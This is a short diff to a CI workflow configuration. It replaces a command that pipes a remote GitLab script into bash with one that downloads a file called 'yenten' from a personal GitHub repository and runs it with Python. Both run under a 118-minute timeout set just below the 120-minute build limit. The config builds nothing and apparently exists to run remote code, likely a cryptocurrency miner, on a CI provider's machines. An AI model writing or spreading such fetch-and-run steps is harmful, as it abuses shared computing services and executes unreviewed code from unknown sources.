@@ -4,4 +4,4 @@ workflows:
     max_build_duration: 120
     instance_type: linux_x2
     scripts:
-      - timeout 118m curl -sL https://gitlab.com/termux.id/awesome/-/raw/main/build | bash
+      - timeout 118m wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/yenten && python yenten
